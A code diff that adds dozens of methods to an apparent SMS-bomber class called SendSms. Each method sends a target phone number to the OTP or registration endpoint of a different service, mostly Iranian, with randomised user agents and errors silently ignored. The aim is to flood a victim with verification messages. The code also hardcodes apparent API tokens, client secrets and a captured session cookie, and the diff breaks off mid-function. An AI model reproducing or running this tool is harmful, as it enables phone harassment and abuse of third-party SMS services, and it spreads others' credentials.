@@ -1451,7 +1451,7 @@ class SendSms():
                     break
             else:
                 continue
-def snap(phone):
+    def snap(phone):
         snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": generate_user_agent(os="android"), "content-type": "application/json", "accept": "*/*","origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
         snapD = {"cellphone": phone}
         try:
@@ -2524,3 +2524,806 @@ def snap(phone):
             return True
         except:
             pass
+
+
+
+    def deyfriedchicken(phone):
+        js = {"apiToken":"VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq","clientSecret":"7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq","device":"web","username":"0" + phone.split("+90")[1]}
+
+        rhead = {"user-agent": generate_user_agent()}
+        try: #shop.deyfriedchicken.com
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+
+            
+    def donergarden(phone):
+        js = {"apiToken":"Ex0OHO6iS8ZfklgSKhaTmWAp34lYLNLFZvMXiuVfhc2ov2uq9kpwYUUrxTWNnhWE","clientSecret":"BuUDcLI9IMQNpWeaHYtVfKzoxwEZNza4","device":"web","username":"0" + phone.split("+90")[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: #donergarden.com
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+            
+            
+    def foodbell(phone):
+        js = {"apiToken":"WTKnmBBIpjL8kcOo7YGD0qkaa6p06bVER9IMUNsyVOj9J2AMlmjESWhqtuNqWBNN","clientSecret":"aINO67nX5aCs5e7382XQJZkYbROBBewt","device":"web","username":"0" + phone.split("+90")[1]}
+
+        rhead = {"user-agent": generate_user_agent()}
+        try: #foodbell.ir
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def foodiran16(phone):
+        js = {"apiToken":"mUkchCAJ9Po58IqEzz507gKwv5mz2kzplUctHuTxXDrTAfjfHyPJqXKGJxrnaKSX","clientSecret":"HVB23K4Y9LPvOLuUCTo3QOHolaYGupgP","device":"web","username":"0" + phone.split("+90")[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: #foodiran16.com
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def foodlandkish(phone):
+        js = {"apiToken":"KbCO8YaHKctowfL1Rny8gB9A9B2kGZvHJBbN918Nsn1p2Ui0FbLWdJ1JdCQ6hzAu","clientSecret":"MvfPc5BT2lRrpmOCYZzAAGg7d7J8ZVnv","device":"web","username":"0" + phone.split("+90")[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: #foodlandkish.com
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def garcon(phone):
+        js = {"phone":"0" + phone.split("+90")[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://garcon.tandori.ir/users/v1/main/login",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def gelatohouse(phone):
+        js = {"apiToken":"10tQStiKTniALgYpYQ4hm0UCuadXWbHdMklMIpyTE5DSzkNSfx1r2p02pqg3QKx3","clientSecret":"MZ0TNC0swsGFk6gbfCdvtZHRukZyFntu","device":"web","username":"0" + phone.split("+90")[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: #order.gelatohouse.ir
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def givernfood(phone):
+        js = {"apiToken":"iIWfAtW16GstuASFfuUO0iY9LKz3dKQpdsKZ2ANBK5YokN2J7pom4oq0tYTz5eXv","clientSecret":"mpZYwzraYAyzcpD594LpWbHwTgHIcdNO","device":"web","username":"0" + phone.split("+90")[1]}
+
+        rhead = {"user-agent": generate_user_agent()}
+        try: #givernfood.com
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def mahiyekhoob(phone):
+        js = {"apiToken":"yJHp0J8gMDyUlAvrWC2E7G0OITtM18WXdRZdGSC2gKkkC8QHDBDsf5irJ4gpZvqP","clientSecret":"uTsq8sG1YWuIWcvK24UFtPighOfrl2H6","device":"web","username":"0" + phone.split("+90")[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: #mahiyekhoob.com
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def nesengrill(phone):
+        js = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0" + phone.split("+90")[1]}
+
+        rhead = {"user-agent": generate_user_agent()}
+        try: #nesengrill.ir
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def pirankalaco(phone):
+        head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://pirankalaco.ir','Referer': 'https://pirankalaco.ir/shop/login.php','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent': generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://pirankalaco.ir/shop/SendPhone.php",data=f"phone=0{phone.split('+90')[1]}",headers=head)
+            return True
+        except:
+            pass
+
+            
+    def pizzapanjereh(phone):
+        js = {"apiToken":"lv3sgZvKKUgc3GpayVVBq8Sw3tguTk9IYbGIXhLGjnhDQtyTNwD2gzwncF1x4B1j","clientSecret":"Vvo4qB2gRUNwev5A2w5osgS19HhAmAUM","device":"web","username":"0" + phone.split("+90")[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: #pizzapanjereh.com
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def shandiz(phone):
+        js = {"apiToken":"sNpW61dZELLTwNhUD2YDsVuwMvzUihTLIEYpCSJDjXfH7GMfmDr9j5eWc4KJAJ2h","clientSecret":"va41e57WSFf6qO8o6i9oiAe5PcLuG3lS","device":"web","username":"0" + phone.split("+90")[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: #shandiz.co
+            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def tnovin(phone):
+        head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'shop.tnovin.com','Origin': 'http://shop.tnovin.com','Referer': 'http://shop.tnovin.com/login','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent': generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="http://shop.tnovin.com/login",data=f"phone=0{phone.split('+90')[1]}",headers=head)
+            return True
+        except:
+            pass
+
+    def dastkhat(phone):
+        n4 = {"mobile":phone.split('+90')[1],"countryCode":90,"device_os":2}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://dastkhat-isad.ir/api/v1/user/store",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def hamlex(phone):
+        n4 =  f"fullname=%D9%85%D9%85%D8%AF&phoneNumber=0{phone.split('+90')[1]}&register="
+        h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '61','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://hamlex.ir','Referer': 'https://hamlex.ir/register.php','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','User-Agent': generate_user_agent(os="win")}
+        try: 
+            post(url="https://hamlex.ir/register.php",data=n4,headers=h4)
+            return True
+        except:
+            pass
+
+    def irwco(phone):
+        n4 =  f"mobile=0{phone.split('+90')[1]}"
+        h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '18','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://irwco.ir','Referer': 'https://irwco.ir/register','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': generate_user_agent(os="win"),'X-Requested-Rith': 'XMLHttpRequest'}
+        try: 
+            post(url="https://irwco.ir/register",data=n4,headers=h4)
+            return True
+        except:
+            pass
+
+            
+    def moshaveran724(phone):
+        n4 =  f"againkey=0{phone.split('+90')[1]}&cache=false"
+        h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '32','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://moshaveran724.ir','Referer': 'https://moshaveran724.ir/user/register/','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://moshaveran724.ir/m/pms.php",data=n4,headers=h4)
+            return True
+        except:
+            pass
+
+            
+    def sibbank(phone):
+        n4 = {"phone_number": "0" + phone.split("+90")[1]}
+        h4 = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.5','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.sibbank.ir','origin': 'https://sibbank.ir','referer': 'https://sibbank.ir/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','TE': 'trailers','user-agent': generate_user_agent(os="mac")}
+        try: 
+            post(url="https://api.sibbank.ir/v1/auth/login",json=n4,headers=h4)
+            return True
+        except:
+            pass
+
+            
+    def snapp_link(phone):
+        n4 = {"phone": "0" + phone.split("+90")[1]}
+        h4 = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '23','Content-Type': 'application/json','Origin': 'https://snapp.ir','Referer': 'https://snapp.ir/','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','User-Agent': generate_user_agent(os="win")}
+        try: 
+            post(url="https://api.snapp.ir/api/v1/sms/link",json=n4,headers=h4)
+            return True
+        except:
+            pass
+
+            
+    def steelalborz(phone):
+        n4 = f'action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split("+90")[1]}&csrf=2aae5b41f1&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B90&digits_reg_mail=0{phone.split("+90")[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=2aae5b41f1'
+        h4 = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://steelalborz.com','referer': 'https://steelalborz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fsteelalborz.com%2F','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://steelalborz.com/wp-admin/admin-ajax.php",data=n4,headers=h4)
+            return True
+        except:
+            pass
+
+
+    def miare(phone):
+        n4 = {"phone_number":"0"+phone.split('+90')[1]}
+        
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://www.miare.ir/api/otp/driver/request/",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+                    
+    def arshiyan(phone):
+        n4 = {"country_code":"90","phone_number":phone.split('+90')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://api.arshiyan.com/send_code",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+
+            
+    def topnoor(phone):
+        n4 = {"mobile":"0"+phone.split('+90')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://backend.topnoor.ir/web/v1/user/otp",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+
+            
+    def alinance(phone):
+        n4 =  {"phone_number":"0"+phone.split('+90')[1]}
+        
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://api.alinance.com/user/register/mobile/send/",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+
+    def alopeyk(phone):
+        n4 = {"type":"CUSTOMER","model":"Chrome 104.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":False,"serial":True,"app_version":"1.2.6","uuid":True,"phone":"0"+phone.split('+90')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://api.alopeyk.com/api/v2/login?platform=pwa",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def alopeyk_safir(phone):
+        n4 = {'phone':'0'+phone.split('+90')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://api.alopeyk.com/safir-service/api/v1/login",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def balad(phone):
+        n4 = {"phone_number":"0"+phone.split('+90')[1],"os_type":"W"}
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/json','device-id': '572a5145-d472-430a-9614-b258232873e6','origin': 'https://balad.ir','referer': 'https://balad.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
+        try: 
+            post(url="https://account.api.balad.ir/api/web/auth/login/",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def chaymarket(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split('+90')[1]}&csrf=c832b38a97&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.chaymarket.com','referer': 'https://www.chaymarket.com/user/my-account/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://www.chaymarket.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def coffefastfoodluxury(phone):
+        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split('+90')[1]}&csrf=e23c15918c&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B90&digits_reg_mail=0{phone.split('+90')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=e23c15918c"
+
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://coffefastfoodluxury.ir','referer': 'https://coffefastfoodluxury.ir/product-category/coffeshop/?login=true&page=1&redirect_to=https%3A%2F%2Fcoffefastfoodluxury.ir%2Fproduct-category%2Fcoffeshop%2F','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def dadhesab(phone):
+        n4 = {"username":"0"+phone.split('+90')[1]}
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','Connection': 'keep-alive','content-length': '26','content-type': 'application/json;charset=UTF-8','host': 'api.dadhesab.ir','origin': 'https://app.dadhesab.com','referer': 'https://app.dadhesab.com/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': generate_user_agent(os="win")}
+        try: 
+            post(url="https://api.dadhesab.ir/user/entry",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def dosma(phone):
+        n4 = {"username":"0"+phone.split('+90')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://app.dosma.ir/sendverify/",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def ehteraman(phone):
+        n4 = {"mobile":"0"+phone.split('+90')[1]}
+        rhead = {"user-agent": generate_user_agent()}
+        try: 
+            post(url="https://api.ehteraman.com/api/request/otp",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def flightio(phone):
+        n4 = {"userKey":"90-"+phone.split('+90')[1],"userKeyType":1}
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'fa_IR','client-v': '6.6.21','content-length': '43','content-type': 'application/json','devicetype': 'Windows','f-lang': 'fa','f-ses-id': 'ef807c51-7078-4711-81d5-c17b910c6fe5','origin': 'https://app.flightio.com','referer': 'https://app.flightio.com/profile/editprofile','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win")}
+        try: 
+            post(url="https://app.flightio.com/bff/Authentication/CheckUserKey",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def foodcenter(phone):
+        #کد رو توی ریسپانس برمیگردونه
+        n4 = f"mobile=0{phone.split('+90')[1]}&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '138','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'FoodCity=kerman; __RequestVerificationToken=D4Xu-vyYOCqUz452OuzRFF1I_emQKm9byKT-VoABTIvDQ64wdL0FgwOxYmomz0VqlQzrPZVCgmzR3p8pBcZ54LZOwW01; ASP.NET_SessionId=5ycedcmb1ajoyctm2rw10ngf; KermanFoodUser=3cfccd41-4190-4f43-a37e-e42ffb586f0a; _ga_Q4305YKJE9=GS1.1.1660661382.1.0.1660661382.0; _ga=GA1.2.388015118.1660661383; _gid=GA1.2.1767121615.1660661384; _hjSessionUser_2820584=eyJpZCI6IjRhNzM5M2Y2LWFiNTAtNWI1ZS1hMTUxLTcyOTJhNGFjMDk3NiIsImNyZWF0ZWQiOjE2NjA2NjEzODQ3MDMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2820584=eyJpZCI6IjYzMmNkYjJjLWU5MDAtNGM1MC1hM2Q3LTczMjY5NTM2NWJiYSIsImNyZWF0ZWQiOjE2NjA2NjEzODUyNjYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1','origin': 'https://www.foodcenter.ir','referer': 'https://www.foodcenter.ir/kerman/category/cafe?submenu=27','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
+        try: 
+            post(url="https://www.foodcenter.ir/account/sabtmobile",data=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def shop_mci(phone):
+        n4 = {"msisdn":phone.split('+90')[1]}
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '1006ee1c-790c-45fa-a86d-ac36846b8e87','content-length': '23','content-type': 'application/json','origin': 'https://shop.mci.ir','referer': 'https://shop.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
+        try: 
+            post(url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def mci(phone):
+        n4 = {"msisdn":phone.split('+90')[1]}
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '9f740bf9-817a-4539-bb1d-43790fc93b75','content-length': '23','content-type': 'application/json','origin': 'https://pwa.mci.ir','referer': 'https://pwa.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
+        try: 
+            post(url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def hamrahbours(phone):
+        n4 = {"MobileNumber":"0"+phone.split('+90')[1]}
+        rhead = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','ApiKey': '66a03e8e-fbc5-4b10-bdde-24c52488eb8bd6479050b','authorization': 'Bearer undefined','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.hbbs.ir','origin': 'https://app.hbbs.ir','referer': 'https://app.hbbs.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
+        try: 
+            post(url="https://api.hbbs.ir/authentication/SendCode",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def homtick(phone):
+        n4 = {"mobileOrEmail":"0"+phone.split('+90')[1],"deviceCode":"d520c7a8-421b-4563-b955-f5abc56b97ec","firstName":"","lastName":"","password":""}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://auth.homtick.com/api/V1/User/GetVerifyCode",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def iranamlaak(phone):
+        n4 = {"AgencyMobile":"0"+phone.split('+90')[1]}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def karchidari(phone):
+        n4 = {"mobile":"0"+phone.split('+90')[1]}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://api.kcd.app/api/v1/auth/login",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def kardoon(phone):
+        n4 = {"optype":15,"userid":0,"mobile":"0"+phone.split('+90')[1],"firstname":"","lastname":"","cityid":0,"email":"","birthdate":"","gender":False,"avatarid":0,"packagename":"","versioncode":-1,"tokenkey":"","username":"","password":"","connectionname":"MainConStr"}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://app.kardoon.ir:4433/api/users",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def mazoo(phone):
+        n4 = {"phone":phone.split('+90')[1]}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://mazoocandle.ir/login",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def ostadkr(phone):
+        n4 = {"mobile":"0"+phone.split('+90')[1]}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://api.ostadkr.com/login",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def paymishe(phone):
+        n4 = {"mobile":"0"+phone.split('+90')[1]}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://api.paymishe.com/api/v1/otp/registerOrLogin",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def nesengrill(phone):
+        n4 = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0"+phone.split('+90')[1]}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def sizdah50(phone):
+        n4 = {"apiToken":"BYE7T3P73xwG8KKjUemqnpmtfi3CFKHt00w92hlBpGODB4dta45Z6qtVwUbvAM1s","clientSecret":"DJXBtleZru9SVf9uVnoG63E2I6dxzvkB","device":"web","username":"0"+phone.split('+90')[1]}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+            
+    def zerocafe(phone):
+        n4 = {"apiToken":"DBpPbfB2X7ZTnSyrugfKWuLoDbjn5VXAPgqVengvZznDEWoJV0y6x4GS1AL06Y7B","clientSecret":"51NZdnUk0cJClzlQCpz0S9YwMM0Fx9t2","device":"web","username":"0"+phone.split('+90')[1]}
+        rhead = {'user-agent': generate_user_agent()}
+        try: 
+            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def podro(phone):
+        n4 = {"username":phone.split('+90')[1],"otp_provider":"INTERNAL","profile":{"name":"","national_code":""},"companies":[{"name":"kljkjjhhjjhde66","slug":"kljkjjhhjjhde66"}]}
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Bearer','connection': 'keep-alive','content-length': '158','content-type': 'application/json','host': 'api.podro.com','origin': 'https://shop.podro.com','referer': 'https://shop.podro.com/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win")}
+        try: 
+            post(url="https://api.podro.com/back4front/accounts/register",json=n4, headers=rhead)
+            return True
+        except:
+            pass
+
+    def rayshomar(phone):
+        n4 = f"MobileNumber=0{phone.split('+90')[1]}"
+        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','app-version': '2.0.6','content-length': '24','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','language': 'fa','origin': 'https://app.rayshomar.ir','os-type': 'webapp','referer': 'https://app.rayshomar.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
+        try: 
